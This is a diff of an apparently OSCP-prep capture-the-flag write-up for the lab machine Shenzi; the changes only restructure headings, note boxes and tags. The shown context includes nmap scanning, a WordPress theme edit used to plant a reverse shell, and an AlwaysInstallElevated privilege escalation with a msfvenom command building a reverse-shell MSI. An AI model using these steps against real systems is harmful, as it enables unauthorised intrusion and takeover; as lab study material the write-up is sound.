@@ -1,7 +1,7 @@
 ---
 layout: /src/layouts/PostLayout.astro
-title: Lavita
-tags: []
+title: Shenzi
+tags: ["Wordpress", "theme", "AlwaysInstallElevated"]
 ---
 **Start 10:24 06-05-2025**
 
@@ -10,9 +10,9 @@ tags: []
 Scope:
 192.168.145.55
 ```
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 ```bash
 sudo nmap -sC -sV shenzi -sT -T5 --min-rate=5000 -Pn -vvvv -p-
@@ -45,12 +45,12 @@ PORT      STATE SERVICE       REASON  VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-## 21/TCP - FTP
+### 21/TCP - FTP
 
 ![](../../../assets/d6a65c435b7188b93fcc2f8112d42048.png)
 
 
-## 80/TCP - HTTP
+### 80/TCP - HTTP
 
 ![](../../../assets/4ea347fd938ac120d2e91290efa74276.png)
 
@@ -69,10 +69,11 @@ I got a few names of the employees:
 We can throw them into `username-anarchy` and create a wordlist of possible username combinations.
 
 
-## 443/TCP - HTTPS
+### 443/TCP - HTTPS
 
->[!note]
->I ran `feroxbuster` here as well, but got the same exact results as on [[#80/TCP - HTTP#Feroxbuster]]
+:::note
+I ran `feroxbuster` here as well, but got the same exact results as on [[#80/TCP - HTTP#Feroxbuster]]
+:::
 
 ![](../../../assets/0d540ec6e3da07ef4d1e865286bb0d64.png)
 
@@ -89,7 +90,7 @@ However the following functions have no value:
 Meaning **LFI** is LIKELY still possible, we just need to find out where and how.
 
 
-## 445/TCP - SMB
+### 445/TCP - SMB
 ### Enum4linux-ng
 
 I started off with `enum4linux-ng`:
@@ -160,8 +161,8 @@ Click **Update File**:
 
 ![](../../../assets/6968bfb0d1d1369ae0297fd3a26b17fb.png)
 
-# Foothold
-## Shell as Shenzi
+## Foothold
+### Shell as Shenzi
 
 In order to activate our reverse shell we will now head on over to the following URL:
 
@@ -195,8 +196,9 @@ We find *shenzi*'s hash:
 
 ![](../../../assets/77d3ede5ed2ede5013bfe367933fa66c.png)
 
->[!important]
->I then found out about this super important part:
+:::important
+I then found out about this super important part:
+:::
 
 ![](../../../assets/de8e1bf9d7c48468f66f38c399afb550.png)
 
@@ -204,8 +206,8 @@ I looked this up on [hacktricks](https://book.hacktricks.wiki/en/windows-hardeni
 
 ![](../../../assets/c988d7d1c39c93f9207120b699f9a950.png)
 
-# Privilege Escalation
-## MSI shell
+## Privilege Escalation
+### MSI shell
 
 This was pretty straightforward and super easy:
 
@@ -217,7 +219,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi > shell.ms
 
 Once transferred I went ahead and executed it and got the shell, ez pz!
 
-## proof.txt
+### proof.txt
 
 ![](../../../assets/6b82ae2c80e3f68bd8c937c60e68bcd9.png)
 
@@ -226,5 +228,3 @@ Once transferred I went ahead and executed it and got the shell, ez pz!
 **Finished 12:06 06-05-2025**
 
 [^Links]: [[OSCP Prep]]
-
-#Wordpress #theme #AlwaysInstallElevated 
